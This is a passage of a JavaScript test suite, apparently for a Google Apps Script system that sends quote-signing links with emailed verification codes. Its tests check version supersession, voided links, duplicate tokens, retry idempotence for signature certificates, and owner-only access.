 setCell(rt,'簽署','簽署ID','sig_1','簽署狀態','已寄送');
 setCell(rt,'簽署','簽署ID','sig_2','簽署狀態','已檢視');
 for(const t of [t1,t2]){
  assert.ok(!pageHtml(rt,t).includes('<canvas'));
  assert.throws(()=>rt.ctx.submitSignature(t,{...payload,code:'123456'}),/無法簽回/);
 }
 assert.equal(signRow(rt,'sig_1').status,'已作廢','the audit log puts the status back');
 assert.equal(signRow(rt,'sig_2').status,'已作廢');
 rt.ui.prompts.push('sig_1','doc_q1');rt.ctx.markSignedFromMenu();
 assert.match(rt.log.alerts.at(-1),/未標記/);
 // V1 cannot even get a fresh link while V2 has been issued: the owner issues V3 to go back to V1's terms.
 queue(rt,1,{id:'sig_1b'});
 rt.ctx.createSignDrafts();
 assert.equal(rt.log.drafts.length,2);
 assert.equal(signRow(rt,'sig_1b').status,'寄送失敗');
 assert.match(signRow(rt,'sig_1b').notes,/較新版本/);
 assert.equal(signRow(rt,'sig_1b').tokenHash,'');
});

test('gap 3: versions are compared as numbers; equal or unreadable versions are refused, not guessed',()=>{
 assert.equal(versionNumber('V10'),10);assert.equal(versionNumber('第2版'),2);assert.ok(Number.isNaN(versionNumber('')));
 const qs=(v1,v2)=>[quote({id:'quo_1',caseId:'case_A',groupId:'g',version:v1}),quote({id:'quo_2',caseId:'case_A',groupId:'g',version:v2})];
 const rows=[sig({id:'sig_1',quoteId:'quo_1',caseId:'case_A',status:'已寄送',tokenHash:'t1',sentAt:new Date(2026,10,20)}),
  sig({id:'sig_2',quoteId:'quo_2',caseId:'case_A',status:'已作廢',tokenHash:'t2',sentAt:new Date(2026,10,10)})];
 // V10 was issued earlier than V9 and voided since; V9 still may not be signed.
 const r=versionBlockReason(signHeaders,rows,0,quoteHeaders,qs('V9','V10'));
 assert.equal(r.superseded,true);assert.equal(r.by,'sig_2');
 assert.equal(versionBlockReason(signHeaders,rows,0,quoteHeaders,qs('V11','V10')).reason,'');
 const same=versionBlockReason(signHeaders,rows,0,quoteHeaders,qs('V2','v2'));
 assert.match(same.reason,/版本相同/);assert.equal(same.superseded,false);
 assert.match(versionBlockReason(signHeaders,rows,0,quoteHeaders,qs('','V2')).reason,/無法辨識/);
 // A queued (never issued) higher version does not close the current one.
 const queuedV2=[rows[0],sig({id:'sig_2',quoteId:'quo_2',caseId:'case_A',status:'待寄送'})];
 assert.equal(versionBlockReason(signHeaders,queuedV2,0,quoteHeaders,qs('V1','V2')).reason,'');
 assert.match(versionBlockReason(signHeaders,rows,0,quoteHeaders,[]).reason,/找不到報價/);
 assert.equal(statusFromEvents([['e','sig_1','作廢'],['e','sig_2','檢視']],'sig_1'),'已作廢');
 assert.equal(statusFromEvents([['e','sig_1','作廢'],['e','sig_1','簽回']],'sig_1'),'已簽回');
 assert.equal(statusFromEvents([],'sig_1'),'');
});

test('gap 3: the effective version never moves back to an older quote',()=>{
 const quotes=[quote({id:'quo_v1',caseId:'case_A',groupId:'g',version:'V1',effective:'否'}),quote({id:'quo_v2',caseId:'case_A',groupId:'g',version:'V2',effective:'是'}),
  quote({id:'quo_old',caseId:'case_A',groupId:'g',version:'',effective:'是'})];
 assert.match(effectiveBlockReason(quoteHeaders,quotes,'case_A','quo_v1'),/不能再成為有效版本/);
 assert.equal(effectiveBlockReason(quoteHeaders,quotes,'case_A','quo_v2'),'','a legacy quote without a version counts as older');
 quotes.push(quote({id:'quo_x',caseId:'case_A',groupId:'g',version:'',effective:'否'}));
 assert.match(effectiveBlockReason(quoteHeaders,quotes,'case_A','quo_x'),/沒有可辨識的版本/);
 assert.equal(effectiveBlockReason(quoteHeaders,quotes,'case_A','quo_missing'),'');
});

test('gap 4: a retry after a failure part-way makes one certificate and one 文件 row',()=>{
 for(const failAt of ['case write','文件 row']){
  const rt=signingWorld();
  const token=issue(rt,1);
  rt.ctx.requestSignCode(token);
  const code=mailedCode(rt);
  let armed=true;
  const boom=(op)=>{if(armed){armed=false;throw new Error('Sheets 逾時');}};
  if(failAt==='case write')rt.book['案件商機'].hooks.push((op)=>op==='setValue'&&boom());
  else rt.book['文件'].hooks.push((op)=>op==='appendRow'&&boom());
  assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code}),/逾時/,failAt);
  assert.notEqual(signRow(rt,'sig_1').status,'已簽回',failAt);
  const res=rt.ctx.submitSignature(token,{...payload,name:'另一個名字',code});
  assert.equal(res.ok,true,failAt);
  const certs=[...rt.files.values()].filter(f=>f.name.includes('簽回證明'));
  assert.equal(certs.length,1,failAt+': one certificate file');
  assert.equal(certs.filter(f=>!f.trashed).length,1);
 assert.equal(certs[0].name,certificateFileName('A701 示範品牌活動','sig_1'));
  const docs=rt.book['文件'].data.filter(r=>r[docHeaders.indexOf('文件類型')]==='簽回');
  assert.equal(docs.length,1,failAt+': one 文件 row');
  const row=signRow(rt,'sig_1');
  assert.equal(row.status,'已簽回');
  assert.equal(row.signer,'王小明',failAt+': the first submission wins');
  assert.equal(row.signedDocId,docs[0][0]);
  assert.equal(findRow(rt,'案件商機','案件ID','case_A701')[caseHeaders.indexOf('簽回文件ID')],docs[0][0]);
  assert.equal(res.name,certs[0].name);
  // Submitting once more changes nothing.
  assert.equal(rt.ctx.submitSignature(token,{...payload,code}).ok,true);
  assert.equal([...rt.files.values()].filter(f=>f.name.includes('簽回證明')).length,1);
  assert.equal(rt.book['簽署事件'].data.filter(r=>r[2]==='簽回').length,1,failAt+': one 簽回 event');
 }
});

test('gap 4: certificate lookups are keyed by the 簽署ID',()=>{
 const name=certificateFileName('A701 報價','sig_7');
 assert.equal(name,'sig_7-簽回證明-A701 報價.pdf','the 簽署ID leads: Drive name search matches prefixes');
 const rows=[rowOf(docHeaders,{'文件ID':'doc_a','文件類型':'簽回','原始檔名':'sig_70-簽回證明-A701 報價.pdf'}),
  rowOf(docHeaders,{'文件ID':'doc_b','文件類型':'報價單','原始檔名':name}),
  rowOf(docHeaders,{'文件ID':'doc_c','文件類型':'簽回','原始檔名':name})];
 assert.equal(findCertificateDoc(docHeaders,rows,'sig_7'),2);
 assert.equal(findCertificateDoc(docHeaders,rows,'sig_8'),-1);
 assert.deepEqual({...parseCertificateMeta(JSON.stringify({signId:'sig_7',name:'王',title:'',signedAt:'2026-11-21 10:00:00'}),'sig_7')},{name:'王',title:'',signedAt:'2026-11-21 10:00:00',agent:'',signedAtIso:'',snapshot:''});
 assert.equal(parseCertificateMeta(JSON.stringify({signId:'sig_8',name:'王',signedAt:'x'}),'sig_7'),null);
 assert.equal(parseCertificateMeta('not json','sig_7'),null);
});

// ---------- Findings of the Codex astra/high review (2026-11-21) ----------

test('review: owner-only actions refuse a visitor Google identifies on the public page',()=>{
 const rt=signingWorld();
 queue(rt,1);
 rt.env.activeUser='visitor@example.com';
 assert.throws(()=>rt.ctx.createSignDrafts(),/選單/);
 assert.throws(()=>rt.ctx.installSigning(),/選單/);
 assert.equal(rt.log.drafts.length,0);
});

test('review: a duplicated 簽署ID gets no link, and a code only works for the link it was mailed for',()=>{
 const rt=signingWorld({versions:['V1']});
 rt.book['報價版本'].appendRow(quote({id:'quo_x',caseId:'case_A701',title:'A701 互補',version:'V1',groupId:'gx',role:'互補',gross:5000,effective:'否',sourceId:'doc_q1'}));
 const tA=issue(rt,1);
 rt.book['簽署'].appendRow(sig({id:'sig_1',quoteId:'quo_x',caseId:'case_A701',sourceId:'doc_q1',recipientEmail:'other@example.com',status:'待寄送'}));
 rt.ctx.createSignDrafts();
 assert.equal(rt.log.drafts.length,1,'no draft for the duplicate');
 assert.match(rt.book['簽署'].data.at(-1)[signHeaders.indexOf('備註')],/簽署ID 重複/);
 // The original link is now ambiguous too, until a person fixes the sheet.
 assert.ok(!pageHtml(rt,tA).includes('<canvas'));
 // Two clean links: a code mailed for one is useless on the other.
 const rt2=signingWorld({versions:['V1']});
 rt2.book['報價版本'].appendRow(quote({id:'quo_2',caseId:'case_A701',title:'A701 互補',version:'V1',groupId:'gx',role:'互補',gross:5000,effective:'否',sourceId:'doc_q1'}));
 const a=issue(rt2,1);
 rt2.book['簽署'].appendRow(sig({id:'sig_2',quoteId:'quo_2',caseId:'case_A701',sourceId:'doc_q1',recipientEmail:'other@example.com',status:'待寄送'}));
 rt2.ctx.createSignDrafts();
 const b=/[?&]t=([0-9a-f]{64})/.exec(rt2.log.drafts[1].body)[1];
 rt2.ctx.requestSignCode(a);
 const codeA=mailedCode(rt2);
 assert.throws(()=>rt2.ctx.submitSignature(b,{...payload,code:codeA}),/先按「寄送驗證碼」/);
});

test('review: a signed link serves nothing more, and the menu repairs only a confirmed signature on unchanged terms',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 rt.ctx.submitSignature(token,{...payload,code:mailedCode(rt)});
 assert.throws(()=>rt.ctx.downloadQuotePdf(token),/無法下載/);
 const docId=signRow(rt,'sig_1').signedDocId;
 rt.ui.prompts.push('sig_1',docId);rt.ctx.markSignedFromMenu();
 assert.match(rt.log.alerts.at(-1),/已經是已簽回/);
 setCell(rt,'報價版本','報價ID','quo_1','含稅金額',999);
 rt.ui.prompts.push('sig_1',docId);rt.ctx.markSignedFromMenu();
 assert.match(rt.log.alerts.at(-1),/未變更：.*快照雜湊不符/);
 // A bare 已簽回 typed by hand, without the event or a document, is not repaired.
 const rt2=signingWorld();
 issue(rt2,1);
 setCell(rt2,'簽署','簽署ID','sig_1','簽署狀態','已簽回');
 rt2.ui.prompts.push('sig_1','doc_q1');rt2.ctx.markSignedFromMenu();
 assert.match(rt2.log.alerts.at(-1),/沒有簽回事件/);
 assert.equal(findRow(rt2,'案件商機','案件ID','case_A701')[caseHeaders.indexOf('簽回文件ID')],'');
});

test('review: a run that stopped after creating the certificate leaves no second PDF and no mixed signer',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 const code=mailedCode(rt);
 let armed=true;
 rt.fileHooks.push((op)=>{if(op==='setDescription'&&armed){armed=false;throw new Error('Drive 逾時');}});
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code}),/逾時/);
 rt.ctx.submitSignature(token,{...payload,name:'第二次',code});
 const live=[...rt.files.values()].filter(f=>f.name.includes('簽回證明')&&!f.trashed);
 assert.equal(live.length,1);
 assert.equal(JSON.parse(live[0].description).name,'第二次','the orphan without details was replaced, not adopted');
 assert.equal(signRow(rt,'sig_1').signer,'第二次');
 // A 文件 row that claims to be this certificate but points at another file stops the run.
 const rt2=signingWorld();
 const t2=issue(rt2,1);
 rt2.ctx.requestSignCode(t2);
 const other=rt2.newFile('sig_1-簽回證明-偽造.pdf',Buffer.from('x'),rt2.folder);
 rt2.book['文件'].appendRow(rowOf(docHeaders,{'文件ID':'doc_fake','文件類型':'簽回','原始檔名':other.name,'文件連結':other.getUrl(),'SHA256':sha('x')}));
 assert.throws(()=>rt2.ctx.submitSignature(t2,{...payload,code:mailedCode(rt2)}),/人工核對/);
 assert.notEqual(signRow(rt2,'sig_1').status,'已簽回');
});

test('review: a terminal status without its event gets the event, so editing the cell back does not reopen it',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 setCell(rt,'簽署','簽署ID','sig_1','簽署狀態','已作廢'); // as if the event append had failed after the row write
 assert.ok(!pageHtml(rt,token).includes('<canvas'));
 assert.ok(rt.book['簽署事件'].data.some(r=>r[1]==='sig_1'&&r[2]==='作廢'));
 setCell(rt,'簽署','簽署ID','sig_1','簽署狀態','已寄送');
 assert.ok(!pageHtml(rt,token).includes('<canvas'));
 assert.equal(signRow(rt,'sig_1').status,'已作廢');
});

test('review: editing or moving a voided newer quote does not let the older version back in',()=>{
 const rt=signingWorld({versions:['V1','V2']});
 issue(rt,1);issue(rt,2);
 assert.equal(signRow(rt,'sig_2').versionRecord,versionRecordFor('case_A701|g1',2));
 rt.ui.prompts.push('sig_2');rt.ctx.voidSignatureFromMenu();
 setCell(rt,'報價版本','報價ID','quo_2','報價組ID','g9');
 setCell(rt,'報價版本','報價ID','quo_2','版本','V0');
 queue(rt,1,{id:'sig_1b'});
 rt.ctx.createSignDrafts();
 assert.equal(rt.log.drafts.length,2,'no new link for V1');
 assert.match(signRow(rt,'sig_1b').notes,/較新版本/);
});

test('review: ambiguous versions are refused even before a peer is issued; 互補 signing switches nothing else off',()=>{
 const qs=[quote({id:'quo_1',caseId:'case_A',groupId:'g',version:''}),quote({id:'quo_2',caseId:'case_A',groupId:'g',version:'V3'})];
 const rows=[sig({id:'sig_1',quoteId:'quo_1',caseId:'case_A',status:'已寄送',tokenHash:'t1'})];
 assert.match(versionBlockReason(signHeaders,rows,0,quoteHeaders,qs).reason,/無法辨識/);
 qs[0]=quote({id:'quo_1',caseId:'case_A',groupId:'g',version:'V3'});
 assert.match(versionBlockReason(signHeaders,rows,0,quoteHeaders,qs).reason,/版本相同/);
 assert.equal(versionBlockReason(signHeaders,rows,0,quoteHeaders,[qs[0]]).reason,'','a lone quote needs no version');
 const eff=[quote({id:'quo_a',caseId:'case_A',groupId:'g',version:'V2',effective:'是'}),quote({id:'quo_b',caseId:'case_A',groupId:'g',version:'V2'})];
 assert.match(effectiveBlockReason(quoteHeaders,eff,'case_A','quo_b'),/版本相同/);
 const mixed=[quote({id:'quo_o',caseId:'case_A',groupId:'g',role:'原案',version:'V1',effective:'是'}),quote({id:'quo_c',caseId:'case_A',groupId:'g',role:'互補',version:'V1'})];
 assert.deepEqual(changes(planEffectiveQuotes(quoteHeaders,mixed,'case_A','quo_c')),[[1,'是']]);
});

test('review: the signing notice goes to the owner even when digest_email names the client',()=>{
 const rt=signingWorld();
 rt.book['設定'].appendRow(['digest_email','buyer@example.com','']);
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 rt.ctx.submitSignature(token,{...payload,code:mailedCode(rt)});
 const toClient=rt.log.sent.filter(m=>m.to==='buyer@example.com');
 assert.equal(toClient.length,1);assert.match(toClient[0].subject,/驗證碼/);
 assert.ok(rt.log.sent.some(m=>m.to==='owner@example.com'&&/簽回/.test(m.subject)));
});

test('review: page views before verification are not attributed to the recipient; public helpers stay bounded',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 pageHtml(rt,token);
 const view=rt.book['簽署事件'].data.find(r=>r[2]==='檢視');
 assert.equal(view[4],'連結開啟者（未驗證）');
 assert.throws(()=>addWorkingDays('2026-11-21',1e9),/範圍/);
});

// ---------- Findings of the follow-up Codex sol review (2026-11-21) ----------

test('follow-up: an issued link keeps the group and version it was issued under',()=>{
 const rt=signingWorld({versions:['V1','V2']});
 issue(rt,1);
 // V1 lapsed and was then replaced by V2: only the menu path could still reach it.
 setCell(rt,'簽署','簽署ID','sig_1','簽署狀態','已過期');
 issue(rt,2);
 setCell(rt,'報價版本','報價ID','quo_1','原案互補追加','互補');
 rt.ui.prompts.push('sig_1','doc_q1');rt.ctx.markSignedFromMenu();
 assert.match(rt.log.alerts.at(-1),/未標記：.*在連結產生後變更/);
 // An interrupted V2 put back in the queue still closes V1: its draft may have reached the client.
 const rt2=signingWorld({versions:['V1','V2']});
 issue(rt2,2);
 setCell(rt2,'簽署','簽署ID','sig_2','簽署狀態','寄送失敗');
 rt2.ui.prompts.push('sig_2');rt2.ui.choices.push('YES');rt2.ctx.retrySendFromMenu();
 assert.equal(signRow(rt2,'sig_2').status,'待寄送');
 assert.equal(signRow(rt2,'sig_2').tokenHash,'');
 assert.ok(signRow(rt2,'sig_2').versionRecord);
 setCell(rt2,'簽署','簽署ID','sig_2','簽署狀態','已作廢');
 queue(rt2,1);
 rt2.ctx.createSignDrafts();
 assert.match(signRow(rt2,'sig_1').notes,/較新版本/);
});

test('follow-up: a directly written newer link is recorded the first time the script reads the sheet',()=>{
 const rt=signingWorld({versions:['V1','V2']});
 const t1=issue(rt,1);
 rt.book['簽署'].appendRow(sig({id:'sig_2',quoteId:'quo_2',caseId:'case_A701',sourceId:'doc_q2',recipientEmail:'buyer@example.com',status:'已寄送',tokenHash:sha('d'.repeat(64)),sentAt:new Date(),dueDate:'2099-12-31'}));
 pageHtml(rt,t1);
 assert.equal(signRow(rt,'sig_2').versionRecord,versionRecordFor('case_A701|g1',2));
 setCell(rt,'報價版本','報價ID','quo_2','報價組ID','g9');
 setCell(rt,'簽署','簽署ID','sig_1','簽署狀態','已寄送');
 assert.ok(!pageHtml(rt,t1).includes('<canvas'));
});

test('follow-up: duplicated tokens or IDs stop the link without touching the original row',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 const original=findRow(rt,'簽署','簽署ID','sig_1');
 rt.book['簽署'].appendRow(sig({id:'sig_copy',quoteId:'quo_1',caseId:'case_A701',sourceId:'doc_q1',recipientEmail:'other@example.com',status:'已寄送',tokenHash:sha(token),dueDate:'2099-12-31'}));
 assert.ok(!pageHtml(rt,token).includes('<canvas'),'two rows share the token');
 assert.throws(()=>rt.ctx.requestSignCode(token),/重新確認/);
 rt.book['簽署'].data.pop();
 // A pasted copy of the row, marked 已作廢, must not void the real link through the audit log.
 const copy=[...original];copy[signHeaders.indexOf('簽署狀態')]='已作廢';copy[signHeaders.indexOf('token雜湊')]='';
 rt.book['簽署'].appendRow(copy);
 assert.ok(!pageHtml(rt,token).includes('<canvas'));
 assert.ok(!rt.book['簽署事件'].data.some(r=>r[1]==='sig_1'&&r[2]==='作廢'));
 rt.book['簽署'].data.pop();
 assert.ok(pageHtml(rt,token).includes('<canvas'),'the original link works once the copy is gone');
});

test('follow-up: menu repair needs the document the 簽回 event recorded; a missing case blocks the menu',()=>{
 const rt=signingWorld();
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 rt.ctx.submitSignature(token,{...payload,code:mailedCode(rt)});
 const docId=signRow(rt,'sig_1').signedDocId;
 assert.equal(signedEventDocId(rt.book['簽署事件'].data,'sig_1'),docId);
 setCell(rt,'簽署','簽署ID','sig_1','簽回文件ID','doc_q1');
 rt.ui.prompts.push('sig_1','doc_q1');rt.ctx.markSignedFromMenu();
 assert.match(rt.log.alerts.at(-1),/與簽回事件記錄的不同/);
 // 已簽回 plus a document typed by hand: no certificate backs it, so no event is made up and no repair runs.
 const rt2=signingWorld();
 issue(rt2,1);
 setCell(rt2,'簽署','簽署ID','sig_1','簽署狀態','已簽回');setCell(rt2,'簽署','簽署ID','sig_1','簽回文件ID','doc_q1');
 rt2.ui.prompts.push('sig_1','doc_q1');rt2.ctx.markSignedFromMenu();
 assert.match(rt2.log.alerts.at(-1),/沒有簽回事件/);
 assert.ok(!rt2.book['簽署事件'].data.some(r=>r[2]==='簽回'));
 const rt3=signingWorld();
 issue(rt3,1);
 rt3.book['案件商機'].data.pop();
 rt3.ui.prompts.push('sig_1','doc_q1');rt3.ctx.markSignedFromMenu();
 assert.match(rt3.log.alerts.at(-1),/找不到案件/);
 assert.equal(signRow(rt3,'sig_1').status,'已寄送');
});

test('follow-up: an unreadable unissued peer blocks the version check',()=>{
 const qs=[quote({id:'quo_1',caseId:'case_A',groupId:'g',version:'V2'}),quote({id:'quo_2',caseId:'case_A',groupId:'g',version:''})];
 const rows=[sig({id:'sig_1',quoteId:'quo_1',caseId:'case_A',status:'已寄送',tokenHash:'t1'})];
 assert.match(versionBlockReason(signHeaders,rows,0,quoteHeaders,qs).reason,/quo_2 版本無法辨識/);
});

test('follow-up: recovery stays in the certificate folder; a lost response gets the certificate back',()=>{
 const rt=signingWorld();
 const elsewhere=rt.otherFolder.createFile({getName:()=>'sig_1-簽回證明-別的試算表.pdf',bytes:Buffer.from('other')});
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 const code=mailedCode(rt);
 // The run dies right after the row turned 已簽回, before the 簽回 event was written.
 let armed=true;
 rt.book['簽署事件'].hooks.push((op,{row})=>{if(op==='appendRow'&&row&&row[2]==='簽回'&&armed){armed=false;throw new Error('Sheets 逾時');}});
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code}),/逾時/);
 const res=rt.ctx.submitSignature(token,{...payload,code});
 assert.match(res.name,/^sig_1-簽回證明-/);
 assert.ok(res.data);
 assert.equal(rt.book['簽署事件'].data.filter(r=>r[1]==='sig_1'&&r[2]==='簽回').length,1,'the missing event is recorded from the certificate');
 assert.equal(elsewhere.trashed,false);
 assert.equal(rt.log.flushes>0,true);
});

test('follow-up: a broken PNG, a wrong code and a failing run are handled without trusting the link holder',()=>{
 const bytes=[...Buffer.from(realPng,'base64')];
 assert.equal(isPngBytes(bytes),true);
 assert.equal(isPngBytes(bytes.slice(0,-12)),false);
 assert.equal(isPngBytes(bytes.map(b=>b>127?b-256:b)),true,'signed bytes as Apps Script returns them');
 const rt=signingWorld();
 const token=issue(rt,1);
 rt.ctx.requestSignCode(token);
 const code=mailedCode(rt);
 const truncated='data:image/png;base64,'+Buffer.from(bytes.slice(0,bytes.length-12)).toString('base64').replace(/=+$/,'').padEnd(Math.ceil((bytes.length-12)/3)*4,'=');
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,image:truncated,code}),/無法讀取/);
 assert.throws(()=>rt.ctx.submitSignature(token,{...payload,code:code==='111111'?'222222':'111111'}),/不正確/);
 const failed=rt.book['簽署事件'].data.find(r=>r[2]==='驗證失敗');
 assert.equal(failed[4],'連結開啟者（未驗證）');
 const before=rt.log.flushes;
 assert.throws(()=>rt.ctx.requestSignCode(token),/一分鐘/);
 assert.ok(rt.log.flushes>before,'writes are flushed even when the run throws');
});
